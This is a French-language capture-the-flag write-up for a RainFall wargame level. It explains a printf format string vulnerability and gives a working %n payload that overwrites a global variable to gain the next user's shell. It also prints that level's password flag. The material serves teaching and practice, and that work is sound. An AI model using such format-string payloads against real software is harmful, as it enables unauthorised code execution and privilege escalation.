# Level 2

En ouvrant level3 avec cutter on voit que le main appelle une fonction v qui lit et stock l'entre standard dans un char * m a l'adresse `0x804988c` ensuite afficher par un printf qui ne precise pas le type de donner attendue ce qui permet de faire une *format string attack*.Il faut donc réussir a injecter la bonne valeur a cette adresse. La format string attack permet de savoir la position de l'adresse dans la stack. A l'aide des %x on peut alors afficher ces adresses. On entre alors une entree reconnaissable comme `a` qui en hexadecimal donne 61 et on y ajoute des %x pour trouver ca position.
```
level3@RainFall:~$ ./level3 
aaaa %x %x %x %x %x %x %x
aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078
level3@RainFall:~$ 
```
On voit alors que l'entree est stockée a la 4eme adresse de la stack, ce qui nous permet d'utiliser un parametre de printf : le %n. Ce dernier permet de  compter les character le precedant et le stocker dans le parametre ici m. Donc il suffit de cree un payload qui va override `0x804988c` (m), afficher 60 caracter (64 - 4 pour l'adresse), %4 pour le 4 `"%x"` au dessus `$n` pour stocker le compte dans m.
```
level3@RainFall:~$ python -c "print '\x8c\x98\x04\x08' + 'a' * 60 + '%4\$n'" > /tmp/payload
level3@RainFall:~$ cat /tmp/payload - | ./level3
�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
